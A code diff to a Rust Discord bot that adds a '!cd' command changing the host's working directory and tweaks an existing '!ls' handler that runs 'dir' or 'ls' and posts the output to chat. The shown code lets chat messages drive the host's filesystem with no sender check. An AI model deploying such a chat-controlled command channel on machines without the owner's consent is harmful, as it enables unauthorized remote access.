@@ -30,6 +30,19 @@ impl EventHandler for Handler {
                 println!("Error executing command: {why:?}");
             }
         }
+        if msg.content.starts_with("!cd ") {
+            let directory = msg.content.strip_prefix("!cd ").unwrap_or("");
+            if !directory.is_empty() {
+                match env::set_current_dir(directory) {
+                    Ok(_) => {
+                        if let Err(why) = msg.channel_id.say(&ctx.http, format!("Done")).await {
+                            println!("Error sending message: {why:?}");
+                        }
+                    }
+                    Err(why) => println!("Error changing directory: {why:?}"),
+                }
+            }
+        }
         if msg.content == "!ls" {
             let output = if cfg!(target_os = "windows") {
                 Command::new("cmd").args(["/C", "dir"]).output()
@@ -41,12 +54,13 @@ impl EventHandler for Handler {
                 Ok(output) => {
                     let result = String::from_utf8_lossy(&output.stdout);
                     let response = format!("```{}```", result);
+                    // TODO handle - Error sending message: Model(MessageTooLong(2085))
                     if let Err(why) = msg.channel_id.say(&ctx.http, response).await {
-                        println!("Error sending ls output: {why:?}");
+                        println!("Error sending message: {why:?}");
                     }
                 }
                 Err(why) => {
-                    println!("Error executing ls command: {why:?}");
+                    println!("Error retrieving output: {why:?}");
                 }
             }
         }
